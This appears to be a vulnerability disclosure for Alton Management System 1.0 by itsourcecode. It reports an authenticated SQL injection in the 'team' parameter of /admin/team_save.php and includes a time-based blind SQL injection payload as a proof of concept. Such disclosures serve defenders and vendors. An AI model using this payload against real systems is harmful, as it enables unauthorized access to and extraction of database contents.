# Vendor

itsourcecode

# Product

Alton Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2020/02/altonsystem.zip

# Description

After logging in as a backend user, request the "/admin/team_save.php" page and pass in the "team" parameter. Due to the lax filtering of the "team" parameter on this page, SQL injection vulnerabilities were created.
<img width="1047" alt="image" src="https://github.com/user-attachments/assets/7243e506-86f9-46a4-99e2-fea1df7d2d03">


# Poc

```
Parameter: team (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: team=1' AND (SELECT 3890 FROM (SELECT(SLEEP(5)))fjEz) AND 'ibZM'='ibZM
```

